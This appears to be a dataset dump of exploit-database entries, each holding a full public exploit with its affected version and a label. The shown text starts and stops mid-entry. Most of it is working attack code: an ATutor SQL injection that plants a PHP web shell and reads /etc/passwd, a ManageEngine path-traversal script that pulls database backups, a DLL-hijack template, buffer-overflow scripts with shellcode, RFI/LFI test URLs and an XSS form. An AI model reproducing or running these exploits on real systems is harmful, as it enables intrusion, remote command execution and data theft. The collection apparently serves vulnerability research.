Sun-Tzu: ""Hence, when able to attack, we must seem unable; when using our   # #  forces, we must seem inactive; when we are near, we must make the enemy     # #  believe we are far away; when far away, we must make him believe we are     # #  near.""                                                                      #  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"", 2); ob_implicit_flush (1);  echo'<html><head><title>ATutor 1.5.1pl2 SQL Injection/remote cmmnds xctn</title> <meta http-equiv=""Content-Type""  content=""text/html; charset=iso-8859-1""> <style type=""text/css""> body {	background-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff; SCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img {background-color:   #FFFFFF   !important}  input  {background-color:    #303030 !important} option {  background-color:   #303030   !important}         textarea {background-color: #303030 !important} input {color: #1CB081 !important}  option {color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox {background-color: #303030 !important} select {font-weight: normal;       color: #1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important; background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size: 0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em !important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em !important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em !important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style: normal !important} *{text-decoration: none !important} a:link,a:active,a:visited { text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline; color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-weight:bold; font-style: italic;}--></style></head> <body> <p class=""Stile6""> ATutor 1.5.1pl2 (possibly prior versions) remote commands xcution </p><p class="" Stile6"">a script by rgod at <a href=""http://rgod.altervista.org""target=""_blank""> http://rgod.altervista.org</a></p><table width=""84%""><tr><td width=""43%""> <form name=""form1""      method=""post""   action=""'.$SERVER[PHP_SELF].'?path=value&host= value&port=value&command=value&proxy=value""><p><input type=""text""   name=""host""> <span class=""Stile5"">hostname (ex: www.sitename.com)  </span>   </p> <p>  <input type=""text"" name=""path""><span class=""Stile5"">  path ( ex:  /atutor/ or just /) </span></p><p> <input type=""text"" name=""pathtoWWW""><span class=""Stile5"">    path to WWW ftom Mysql directory, need this for ""...INTO OUTFILE ..."" statement (default: ../../www) </span></p><p><input type=""text"" name=""port"" >        <span class=""Stile5""> specify a port other than 80 (default value)</span>      </p><p> <input type=""text"" name=""command""> <span  class=""Stile5"">a Unix command , example: ls -la  to list directories, cat /etc/passwd to show passwd file,   cat ./include/config.inc.php to see database username and password</span> </p><p><input type=""text"" name=""proxy""><span class=""Stile5"">send exploit through an HTTP proxy (ip:port)</span></p><p><input type=""submit""name=""Submit"" value=""go!""></p></form></td></tr></table></body></html>';   function show($headeri) { $ii=0; $ji=0; $ki=0; $ci=0; echo '<table border=""0""><tr>'; while ($ii <= strlen($headeri)-1) { $datai=dechex(ord($headeri[$ii])); if ($ji==16) {              $ji=0;              $ci++;              echo ""<td>&nbsp;&nbsp;</td>"";              for ($li=0; $li<=15; $li++)                       { echo ""<td>"".$headeri[$li+$ki].""</td>""; 			    }             $ki=$ki+16;             echo ""</tr><tr>"";             } if (strlen($datai)==1) {echo ""<td>0"".$datai.""</td>"";} else {echo ""<td>"".$datai.""</td> "";} $ii++; $ji++; } for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)                       { echo ""<td>&nbsp&nbsp</td>"";                        }  for ($li=$ci*16; $li<=strlen($headeri); $li++)                       { echo ""<td>"".$headeri[$li].""</td>""; 			    } echo ""</tr></table>""; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';  function sendpacket() //if you have sockets module loaded, 2x speed! if not,load 		              //next function to send packets {   global $proxy, $host, $port, $packet, $html, $proxy_regex;   $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);   if ($socket < 0) {                    echo ""socket_create() failed: reason: "" . socket_strerror($socket) . ""<br>"";                    } 	      else  		  {   $c = preg_match($proxy_regex,$proxy);               if (!$c) {echo 'Not a valid prozy...';                         die;                        }                     echo ""OK.<br>"";                     echo ""Attempting to connect to "".$host."" on port "".$port.""...<br>"";                     if ($proxy=='') 		   { 		     $result = socket_connect($socket, $host, $port); 		   } 		   else 		   {  		   $parts =explode(':',$proxy);                    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>'; 		   $result = socket_connect($socket, $parts[0],$parts[1]); 		   } 		   if ($result < 0) {                                      echo ""socket_connect() failed.\r\nReason: ("".$result."") "" . socket_strerror($result) . ""<br><br>"";                                     } 	                       else 		                    {                                      echo ""OK.<br><br>"";                                      $html= '';                                      socket_write($socket, $packet, strlen($packet));                                      echo ""Reading response:<br>"";                                      while ($out= socket_read($socket, 2048)) {$html.=$out;}                                      echo nl2br(htmlentities($html));                                      echo ""Closing socket..."";                                      socket_close($socket);  				    }                   } } function sendpacketii($packet) { global $proxy, $host, $port, $html, $proxy_regex; if ($proxy=='')            {$ock=fsockopen(gethostbyname($host),$port);}              else            { 	   $c = preg_match($proxy_regex,$proxy);               if (!$c) {echo 'Not a valid prozy...';                         die;                        } 	   $parts=explode(':',$proxy); 	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>'; 	    $ock=fsockopen($parts[0],$parts[1]); 	    if (!$ock) { echo 'No response from proxy...'; 			die; 		       } 	   } fputs($ock,$packet); if ($proxy=='')   {      $html='';     while (!feof($ock))       {         $html.=fgets($ock);       }   } else   {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))     {       $html.=fread($ock,1);     }   } fclose($ock); echo nl2br(htmlentities($html)); }   if (($host<>'') and ($path<>'') and ($command<>'')) {   $port=intval(trim($port));   if ($port=='') {$port=80;}   if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}   if ($pathtoWWW=='') {$pathtoWWW=""../../www"";}   #default, path for ""INTO OUTFILE <[path][file]>, two dirs up from mysql data directory, change it for   #different installations   if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  $SQL=""FAKE@FAKEMAIL.FKE"".urlencode(chr(0x00).""'UNION SELECT 0,0,0,0,'<?php echo \""Hi Master\""; error_reporting(0);ini_set(\""max_execution_time\"",0);system(\$_GET[cmd]);?>',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 INTO OUTFILE \"""".$pathtoWWW.$path.""shell.php\"" FROM at_members/*""); $data=""login=suntzu&password=jimijimi&password2=jimijimi&email="".$SQL.""&lang=en&first_name=&last_name=&year=&month=&day=&gender=ns&address=&postal=&city=&province=&country=&phone=&website=http%3A%2F%2F&submit=+Submit+""; $packet=""POST "".$p.""registration.php HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; show($packet); sendpacketii($packet);  $packet=""GET "".$p.""shell.php?cmd="".urlencode($command)."" HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; show($packet); sendpacketii($packet);  if (eregi(""Hi Master"",$html)) {echo ""<br>Exploit Succeded..."";}                          else {echo ""<br>Exploit Failed..."";} } else {echo 'Fill in requested fields, optionally specify a proxy';} ?>  # milw0rm.com [2005-11-07]",['1.5.1pl2'],1
22158,"WordPress Plugin social discussions 6.1.1 - Multiple Vulnerabilities [waraxe-2012-SA#093] - Multiple Vulnerabilities in Wordpress Social Discussions Plugin ======================================================================================  Author: Janek Vind ""waraxe"" Date: 17. October 2012 Location: Estonia, Tartu Web: http://www.waraxe.us/advisory-93.html   Description of vulnerable target: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Enables Social Sharing of your blog posts to 30+ Social Networks. Plugin also enables you to Automatically Publish or Self Publish your Blog Posts to 25+  Networks.  http://wordpress.org/extend/plugins/social-discussions/  Affected version: 6.1.1  ############################################################################### 1. Remote File Inclusion in ""social-discussions-networkpub_ajax.php"" ###############################################################################  Reasons: Uninitialized variable ""$HTTP_ENV_VARS"" Attack vectors: User-supplied parameter ""HTTP_ENV_VARS"" Preconditions:  1. register_globals=on  2. register_long_arrays=off  3. allow_url_include=on for RFI if PHP >= 5.2.0  4. PHP must be < 5.3.4 for LFI null-byte attacks  5. magic_quotes_gpc=off for LFI null-byte attacks     Php script ""social-discussions-networkpub_ajax.php"" line 2: ------------------------[ source code start ]---------------------------------- if (!function_exists('add_action')){   @include_once($GLOBALS['HTTP_ENV_VARS']['DOCUMENT_ROOT'] . ""/wp-config.php""); ------------------------[ source code end ]------------------------------------  We can see, that script expects old-style array ""HTTP_ENV_VARS"" to be initialized and containing ""DOCUMENT_ROOT"" entry. But it appears, that if PHP directive ""register_long_arrays=off"", then ""HTTP_ENV_VARS"" is uninitialized and if in same time ""register_globals=on"", it is possible to fill that array with any value, leading to the RFI (Remote File Inclusion) vulnerability.   Tests:  http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions-networkpub_ajax.php?HTTP_ENV_VARS[DOCUMENT_ROOT]=http://php.net/?  http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions-networkpub_ajax.php?HTTP_ENV_VARS[DOCUMENT_ROOT]=/proc/self/environ%00z   ############################################################################### 2. Full Path Disclosure in multiple scripts ###############################################################################  Reasons: Direct request to php script triggers pathname leak in error message Preconditions: PHP directive display_errors=on Result: Information Exposure Through an Error Message  Tests:  http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions-networkpub.php  Fatal error: Call to undefined function __() in C:\apache_www\wp342\wp-content\plugins\social-discussions\social-discussions-networkpub.php on line 2  http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions.php  Fatal error: Call to undefined function __() in C:\apache_www\wp342\wp-content\plugins\social-discussions\social-discussions-networkpub.php on line 2  http://localhost/wp342/wp-content/plugins/social-discussions/social_discussions_service_names.php  Fatal error: Call to undefined function __() in C:\apache_www\wp342\wp-content\plugins\social-discussions\social_discussions_service_names.php on line 3    Contact: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  come2waraxe@yahoo.com Janek Vind ""waraxe""  Waraxe forum:  http://www.waraxe.us/forums.html Personal homepage: http://www.janekvind.com/ Random project: http://albumnow.com/ ---------------------------------- [ EOF ] ------------------------------------",['6.1.1'],1
14721,"Wireshark 1.2.10 - 'airpcap.dll' DLL Hijacking /* Exploit Title: Wireshark <= 1.2.10 DLL Hijacking Exploit (airpcap.dll) Date: 24/08/2010 Author: TheLeader Email: gsog2009 [a7] hotmail [d0t] com Software Link: http://www.wireshark.org/download.html Version: 1.2.10 and prior Tested on: Windows 7 x86 (6.1.7600)  As seen on Metasploit blog (rock on HDM!):  http://blog.metasploit.com/2010/08/exploiting-dll-hijacking-flaws.html  Probably gonna see alot of these bugs getting exploited in the near future..  Compile and rename to airpcap.dll, create a file in the same dir with one of the following extensions.  Default Wireshark file extension associations: .5vw / .acp / .apc / .atc / .bfr / .cap / .enc / .erf / .fdc / .pcap / .pcapng / .pkt / .rf5 / .snoop / .syc / .tpc / .tr1 / .trace / .trc / .wpc / .wpz  Double click & watch a nice calculator pop =] Shouts to all the great guys at forums.hacking.org.il */  #include <windows.h> #define DLLIMPORT __declspec (dllexport)  DLLIMPORT void AirpcapGetDeviceList() { evil(); } DLLIMPORT void AirpcapFreeDeviceList() { evil(); } DLLIMPORT void AirpcapOpen() { evil(); } DLLIMPORT void AirpcapClose() { evil(); } DLLIMPORT void AirpcapGetLinkType() { evil(); } DLLIMPORT void AirpcapSetLinkType() { evil(); } DLLIMPORT void AirpcapSetKernelBuffer() { evil(); } DLLIMPORT void AirpcapSetFilter() { evil(); } DLLIMPORT void AirpcapGetMacAddress() { evil(); } DLLIMPORT void AirpcapSetMinToCopy() { evil(); } DLLIMPORT void AirpcapGetReadEvent() { evil(); } DLLIMPORT void AirpcapRead() { evil(); } DLLIMPORT void AirpcapGetStats() { evil(); } DLLIMPORT void AirpcapTurnLedOn() { evil(); } DLLIMPORT void AirpcapTurnLedOff() { evil(); } DLLIMPORT void AirpcapGetDeviceChannel() { evil(); } DLLIMPORT void AirpcapSetDeviceChannel() { evil(); } DLLIMPORT void AirpcapGetFcsPresence() { evil(); } DLLIMPORT void AirpcapSetFcsPresence() { evil(); } DLLIMPORT void AirpcapGetFcsValidation() { evil(); } DLLIMPORT void AirpcapSetFcsValidation() { evil(); } DLLIMPORT void AirpcapGetDeviceKeys() { evil(); } DLLIMPORT void AirpcapSetDeviceKeys() { evil(); } DLLIMPORT void AirpcapGetDecryptionState() { evil(); } DLLIMPORT void AirpcapSetDecryptionState() { evil(); } DLLIMPORT void AirpcapStoreCurConfigAsAdapterDefault() { evil(); } DLLIMPORT void AirpcapGetVersion() { evil(); } DLLIMPORT void AirpcapGetDriverDecryptionState() { evil(); } DLLIMPORT void AirpcapSetDriverDecryptionState() { evil(); } DLLIMPORT void AirpcapGetDriverKeys() { evil(); } DLLIMPORT void AirpcapSetDriverKeys() { evil(); } DLLIMPORT void AirpcapSetDeviceChannelEx() { evil(); } DLLIMPORT void AirpcapGetDeviceChannelEx() { evil(); } DLLIMPORT void AirpcapGetDeviceSupportedChannels() { evil(); }  int evil() {   WinExec(""calc"", 0);   exit(0);   return 0; }",['1.2.10'],1
10782,"Mini-stream Ripper 3.0.1.1 - '.pls' Universal Buffer Overflow (Perl) #Mini-Stream Ripper v3.0.1.1 Universal BOF !!! #Discovered by ( mr_me) !!! #Coded and Written by (Jacky) #Greetz to Peter Van Eeckhoutte and all Corelanc0d3r team :D #This time i exploited the program and i used as RET address a Universal one from MSRcodec00.dll #And i haven't seen anyone using a universal address so i decided to do so ! ;-) my $file=""crash.pls""; print ""Mini-Stream Ripper 3.0.1.1 Universal BOF vulnerability\n""; print ""Greetz to Peter Van Eeckhoutte and Corelanc0d3r Team\n""; my $junk=""A""x26074; my $eip=pack('V',0x0146b87b);  #>>>From MSRcodec001.dll (Universal address ;-) ) my $presc=""SEXY"";         # 4 Bytes to fill the pre-esp area ! my $esp=""\x90""x25; $esp=$esp.""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"". ""\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x57"". ""\x45\x50\x4a\x37\x41\x50\x4f\x4e\x4b\x38\x4f\x44\x4a\x31\x4b\x38"". ""\x4f\x55\x42\x32\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x43\x4b\x58"". ""\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x38\x42\x4c"". ""\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x43\x46\x55\x46\x52\x46\x50\x45\x47\x45\x4e\x4b\x58"". ""\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x34"". ""\x4b\x48\x4f\x35\x4e\x51\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x48"". ""\x41\x30\x4b\x4e\x49\x38\x4e\x35\x46\x32\x46\x50\x43\x4c\x41\x33"". ""\x42\x4c\x46\x36\x4b\x48\x42\x54\x42\x33\x45\x38\x42\x4c\x4a\x57"". ""\x4e\x50\x4b\x48\x42\x54\x4e\x30\x4b\x38\x42\x57\x4e\x41\x4d\x4a"". ""\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x50\x4b\x58\x42\x48\x42\x4b"". ""\x42\x50\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x53\x4f\x35\x41\x43"". ""\x48\x4f\x42\x46\x48\x55\x49\x48\x4a\x4f\x43\x58\x42\x4c\x4b\x57"". ""\x42\x35\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x46\x4a\x49"". ""\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x46"". ""\x4e\x46\x43\x36\x42\x30\x5a"";  open(HOLA,"">$file""); print HOLA $junk.$eip.$presc.$esp; print ""[+] Done!!!\n""; print ""Written By Jacky\n""; close(HOLA);",['3.0.1.1'],1
17503,"ManageEngine ServiceDesk 8.0.0.12 - Database Disclosure # Exploit Title: ManageEngine ServiceDesk <= 8.0.0.12 Database Disclosure # Google Dork: none # Date: 07.07.2011 # Author: @ygoltsev # Software Link: http://www.manageengine.com/ # Version: <=8.0.0.12 # Tested on: Windows # CVE : None     #!/usr/bin/perl use LWP::UserAgent; use File::stat;  $ptxt="" ################################################# # _____             _         ____          _    #|   __|___ ___ _ _|_|___ ___|    \ ___ ___| |_  #|__   | -_|  _| | | |  _| -_|  |  | -_|_ -| '_| #|_____|___|_|  \_/|_|___|___|____/|___|___|_,_| #                                             #################################################  [0-day] [Database disclosure] [desc: Exploit for ServiceDesk v *.* OS: Windows] "";  print $ptxt;     $ua=LWP::UserAgent->new();     $url=""http://127.0.0.1"";  $path=""/workorder/FileDownload.jsp"";        $installPath=&getInstallPathWin($url,$path);     if ($installPath ne """") {                  @backups=&getServerOutLogs($url,$path,$installPath);  } else {                  print ""Install path not found :(\n"";                  exit();  }     if (scalar(@backups)>0) {                  print ""hehe.. We got paths to backup files..\n If they are on the same drive and exists - we will own their world!!\n"";                  foreach $backLine (@backups) {                                 @backInfo=split(/ --- /,$backLine);                                 #print ""Trying to download $backInfo[1] from $backInfo[0]...\n"";                                 &downloadBackups($url,$path,$backLine);                  }  }  unlink(""bad"");     print ""Dude, check out \'db_backups.html\'\n"";        sub downloadBackups {                  my ($url,$path,$backLine) = @_;                  @backInfo=split(/ --- /,$backLine);    $backupUrl=""${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\ ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\ ..\\..\\..\\..\\$backInfo[0]$backInfo[1]"";                  #$br=$ua->get($backupUrl);                  #if ($br->is_success) {                  #             open(A,"">$backInfo[1]"");                  #             print A $br->content;                  #             close(A);                  #}                  open(A,"">>db_backups.html"");                  print A ""<a href='$backupUrl'>$backInfo[1]</a><br>\n"";                  close(A);  }           sub getServerOutLogs {                  my ($url,$path,$installPath) = @_;                      $badUrl=""${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\..\ \..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\ \..\\..\\..\\${installPath}server\\default\\log\\serverout11111111111${i}.tx t"";                  $br=$ua->get($badUrl);                  if ($br->is_success) {                                 open(A,"">bad"");                                 print A $br->content;                                 close(A);                  }                     for ($i=0;$i<=10;$i++) {    $logUrl=""${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\..\ \..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\ \..\\..\\..\\${installPath}server\\default\\log\\serverout${i}.txt"";                                 $br=$ua->get($logUrl);                                 if ($br->is_success) {                                                 open(A,"">${i}.txt"");                                                 print A $br->content;                                                 close(A);                                                 if (stat(""bad"")->size!=stat(""${i}.txt"")->size) {                                                 } else {    unlink(""${i}.txt"");                                                 }                                 }                  }                     for ($i=0;$i<=10;$i++) {                                 if (-e ""${i}.txt"") {                                                 open(A,""${i}.txt"");                                                 @log=<A>;                                                 close(A);                                                 foreach $line (@log) {                                                                 if ($line=~/: Build number(.*): ([0-9]+)\|/) {    $tBuild=$2;    if ($sdBuild eq """") {    $sdBuild=$tBuild;    }                                                                 }                                                                 if ($line=~/\[([0-9]+):([0-9]+):([0-9]+):([0-9]+)\]\|\[([0-9]+)-([0-9]+)-([0-9] +)\]\|\[SYSOUT\](.*)BACKUPDIR=(.*), ATTACHMENT=/) {    push(@backups,""$9 --- backup_servicedesk_XBUILDX_database_${5}_${6}_${7}_${1}_${2}.data"");                                                                     }                                                 }                                                 unlink(""${i}.txt"");                                 }                  }                                    if (scalar(@backups)>0) {                                 print ""Man, you are realy lucky! We found some info about ServiceDesk backups..\nBUT, I need your help now, hehe\nLet's construct directories!\np.s. type without drive letter, like \\backup\\\n"";                  } else {                                 print ""Bad luck.. Check your karma, seriously..Where is my fucking latte!?!?\np.s. No info about backups was found :("";                                 exit();                  }                                    foreach $mb (@backups) {                                 $mb=~s/XBUILDX/$sdBuild/gi;                                 @dir=split(/ --- /,$mb);                                 print ""Trash Dir: $dir[0]\n"";                                 print ""Right Dir: "";                                 chomp($rDir=<STDIN>);                                 if ($rDir ne """") {                                                 $fullDB=$dir[1];    $fullDB=~s/database/fullbackup/gi;                                                 push(@backupFiles,""$rDir --- $dir[1]"");                                                 push(@backupFiles,""$rDir --- $fullDB"");                                 }                  }                  return @backupFiles;  }              sub getInstallPathWin {                  my ($url,$path) = @_;    $url1=""${url}${path}?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\. .\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\. .\\..\\..\\"";                  @paths=(""ServiceDesk\\"",""ManageEngine\\ServiceDesk\\"");    @checkFiles=(""dashgjifyq8412348fhsjfghjqw.txt"",""COPYRIGHT"",""logs\\configport .txt"",""bin\\run.bat"",""server\\default\\log\\boot.log"");                  $i=0;                  foreach $p (@paths) {                                 $k=0;                                 foreach $f (@checkFiles) {                                                 $checkUrl=""${url1}${p}${f}"";                                                 $br=$ua->get($checkUrl);                                                 if ($br->is_success) {    open(A,"">${i}${k}"");                                                                 print A $br->content;                                                                 close(A);                                                 }                                                 $k++;                                 }                                 $i++;                  }                  for ($i=0;$i<scalar(@paths);$i++) {                                 $ok=0;                                 for ($k=0;$k<scalar(@checkFiles);$k++) {                                                 if (-e ""${i}${k}"") {                                                                 if ($k==0) {    $incorrectSize=stat(""${i}${k}"")->size;                                                                 } else {    if (stat(""${i}${k}"")->size!=$incorrectSize) {    $ok++;    }                                                                 }                                                 }                                 }                                 if ($ok>0) {                                                 if ($ok==4) {                                                                 print ""You are lucky! \nServiceDesk installed to: $paths[$i]\n"";    $ret=$paths[$i];                                                 } elsif ($ok>2) {                                                                 print ""I think ServiceDesk installed to: $paths[$i]\n"";    $ret=$paths[$i];                                                 } elsif ($ok>1) {                                                                 print ""You are lucky if ServiceDesk installed to: $paths[$i]\n"";    $ret=$paths[$i];                                                 }                                 }                  }                        for ($i=0;$i<scalar(@paths);$i++) {                                 for ($k=0;$k<scalar(@checkFiles);$k++) {                                                 unlink(""${i}${k}"");                                 }                  }                     if ($ret eq """") {                                 print ""Bad luck man :\/\n"";                                          $ret=0;                  }                  return $ret;  }",['8.0.0.12'],1
1775,"Microsoft Internet Explorer 6.0.2900 SP2 - CSS Attribute Denial of Service <!-- # Internet Explorer <= 6.0.2900 SP2 # # suffers from a DoS vulnerability in which a remote users # Internet Explorer session can be crashed when hovering # their cursor over a specially made table. The fault occurs # when the ""position"" CSS attribute is set to a table. # This results in an 'unhandled exception in iexplorer.exe(MSHTML.DLL)' # # $uid-seven # # shout outs to cijfer -->  <html> <head> </style> <meta http-equiv=""Content-Type"" content=""text/html; charset=windows-1252""> <title>IE-Crash - By seven</title> <style type=""text/css"">  #header{ position: fixed; height: 761px; width: 1268; } </style> </head> <body> <table border=""2"" cellpadding=""0"" cellspacing=""0"" width=""797"" height=""343"" align=""center"">      <tr>      <td id=""header"" valign=""top"">          </td> <td valign=""top"">          </td> </table>  # milw0rm.com [2006-05-10]",['6.0.2900 SP2'],1
16078,"SDP Downloader 2.3.0 - 'http_response' Remote Buffer Overflow #!/usr/bin/python #Bug : SDP Downloader (http_response) Remote Buffer Overflow Exploit # by: sup3r #Tested on : Xp sp3 #http://sdp.ppona.com/  from socket import *  # win32_exec -  EXITFUNC=process CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com shellcode=( ""\x33\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x71"" ""\xf3\x2a\x67\x83\xeb\xfc\xe2\xf4\x8d\x1b\x6e\x67\x71\xf3\xa1\x22"" ""\x4d\x78\x56\x62\x09\xf2\xc5\xec\x3e\xeb\xa1\x38\x51\xf2\xc1\x2e"" ""\xfa\xc7\xa1\x66\x9f\xc2\xea\xfe\xdd\x77\xea\x13\x76\x32\xe0\x6a"" ""\x70\x31\xc1\x93\x4a\xa7\x0e\x63\x04\x16\xa1\x38\x55\xf2\xc1\x01"" ""\xfa\xff\x61\xec\x2e\xef\x2b\x8c\xfa\xef\xa1\x66\x9a\x7a\x76\x43"" ""\x75\x30\x1b\xa7\x15\x78\x6a\x57\xf4\x33\x52\x6b\xfa\xb3\x26\xec"" ""\x01\xef\x87\xec\x19\xfb\xc1\x6e\xfa\x73\x9a\x67\x71\xf3\xa1\x0f"" ""\x4d\xac\x1b\x91\x11\xa5\xa3\x9f\xf2\x33\x51\x37\x19\x8d\xf2\x85"" ""\x02\x9b\xb2\x99\xfb\xfd\x7d\x98\x96\x90\x4b\x0b\x12\xf3\x2a\x67"")  buffer =  '\x41'*4 buffer += shellcode buffer += '\x41'*(65584-len(shellcode)) buffer += '\xF0\xF1\xAB\x00'	 #00ABF1F0(shellcode address) buffer += '\x41'*36 buffer += '\xBC\xEB\x12\x00'	 #0012EBBC Stack section (writable) buffer += '\x43'*9000  header=( ""HTTP/1.1 200 OK\r\n"" ""Content-Type: video/""+buffer+""\r\n"" ""Last-Modified: 20 Mar 2010 09:50:10 GMT\r\n"" ""Accept-Ranges: bytes\r\n"" ""ETag: \""075a1fc3d4dc41:0\""\r\n"" ""Server: Microsoft-IIS/7.5\r\n"" ""X-Powered-By: ASP.NET\r\n"" ""Date: Sat, 20 Mar 2010 14:31:46 GMT\r\n"" ""Connection: close\r\n"" ""Content-Length: 324\r\n\r\n"")  s = socket(AF_INET, SOCK_STREAM) s.bind((""0.0.0.0"", 80)) s.listen(1) print ""[+] Listening on [HTTP] 80"" c, addr = s.accept() print ""[+] Connection accepted from: %s"" % (addr[0]) c.recv(1024) c.send(header) c.send(header) raw_input(""[+] Done, press enter to quit"") c.close() s.close()",['2.3.0'],1
12489,"Joomla! 1.6.0 Alpha2 - Cross-Site Scripting # Title:Joomla_1.6.0-Alpha2 XSS Vulnerabilities  # Date: 2010-05-02 # Author: mega-itec.com # Software Link: http://joomlacode.org/gf/download/frsrelease/11322/45252/Joomla_1.6.0-Alpha2-Full-Package.zip # Version: 1.6.0-alpha2 # Tested on: [relevant os] # CVE :  # Code :  [:::::::::::::::::::::::::::::::::::::: 0x1 ::::::::::::::::::::::::::::::::::::::] >> General Information Advisory/Exploit Title = Joomla_1.6.0-Alpha2 XSS Vulnerabilities  Author = mega-itec security team Contact = securite@mega-itec.com    [:::::::::::::::::::::::::::::::::::::: 0x2 ::::::::::::::::::::::::::::::::::::::] >> Product information Name = Joomla Vendor = Joomla Vendor Website = http://www.joomla.org/ Affected Version(s) = 1.6.0-Alpha2      [:::::::::::::::::::::::::::::::::::::: 0x3 ::::::::::::::::::::::::::::::::::::::] >> #1 Vulnerability Type = XSS ( POST ) mailto,subject,from,sender  Example URI =  option=com_mailto&task=user%2Elogin&32720689cad34365fbe10002f91e50a9=1&mailto=%F6""+onmouseover=prompt(406426661849)//&sender=mega-itec@mega-ite.com&from=mega-itec@mega-ite.com&subject=mega-itec@mega-ite.com&layout=default&tmpl=component&link=encode link with base 64   >> #2 html code exploit :  <form action=""http://localhost/Joomla_1.6.0-Alpha2-Full-Package/index.php"" name=""mailtoForm"" method=""post"">  <div style=""padding: 10px;""> 	<div style=""text-align:right""> 		<a href=""javascript: void window.close()""> 			Close Window <img src=""http://localhost/Joomla_1.6.0-Alpha2-Full-Package/components/com_mailto/assets/close-x.png"" border=""0"" alt="""" title="""" /></a> 	</div>  	<h2> 		E-mail this link to a friend.	</h2>  	<p> 		E-mail to: 		<br /> 		<input type=""text"" name=""mailto"" class=""inputbox"" size=""25"" value=""&#65533;"" onmouseover=prompt(406426661849)//""/> 	</p>  	<p> 		Sender: 		<br /> 		<input type=""text"" name=""sender"" class=""inputbox"" value=""mega-itec@mega-ite.com"" size=""25"" /> 	</p>  	<p> 		Your E-mail: 		<br /> 		<input type=""text"" name=""from"" class=""inputbox"" value=""mega-itec@mega-ite.com"" size=""25"" /> 	</p>  	<p> 		Subject: 		<br /> 		<input type=""text"" name=""subject"" class=""inputbox"" value=""mega-itec@mega-ite.com"" size=""25"" /> 	</p>  	<p> 		<button class=""button"" onclick=""return submitbutton('send');""> 			Send		</button> 		<button class=""button"" onclick=""window.close();return false;""> 			Cancel		</button> 	</p> </div>  	<input type=""hidden"" name=""layout"" value=""default"" /> 	<input type=""hidden"" name=""option"" value=""com_mailto"" /> 	<input type=""hidden"" name=""task"" value=""send"" /> 	<input type=""hidden"" name=""tmpl"" value=""component"" /> 	<input 